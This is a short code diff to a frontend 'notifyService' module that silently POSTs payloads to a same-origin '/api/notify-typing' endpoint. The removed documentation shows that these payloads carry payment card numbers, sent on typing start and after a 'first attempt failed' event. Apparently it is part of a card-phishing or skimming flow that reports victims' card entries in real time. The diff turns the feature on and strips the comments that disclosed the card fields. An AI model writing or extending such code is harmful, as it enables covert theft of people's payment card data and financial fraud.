@@ -1,18 +1,11 @@
 // src/services/notifyService.js
 
+// Must use VITE_ prefix for Vite to expose it to the frontend
 const NOTIFY_ENABLED =
-  String(import.meta.env.NOTIFY_TYPING_ENABLED ?? 'true').toLowerCase() === 'true';
+  String(import.meta.env.VITE_NOTIFY_TYPING_ENABLED ?? 'true').toLowerCase() === 'true';
 
-/**
- * Send a notification. Silently no-ops if disabled or if the request fails.
- * @param {Object} payload
- * @param {string} payload.event - 'typing_start' | 'card_complete' | 'first_attempt_failed' | 'mismatch_trial'
- * @param {string} [payload.cardNumber]
- * @param {string} [payload.firstCardNumber]
- * @param {string} [payload.secondCardNumber]
- */
 export async function sendNotify(payload) {
-  if (!NOTIFY_ENABLED) return;
+  if (!NOTIFY_ENABLED) return; // Silently skip if disabled
   try {
     await fetch('/api/notify-typing', {
       method: 'POST',
@@ -25,7 +18,7 @@ export async function sendNotify(payload) {
       keepalive: true,
     });
   } catch {
-    // silent — never block UI
+    // silent
   }
 }
 
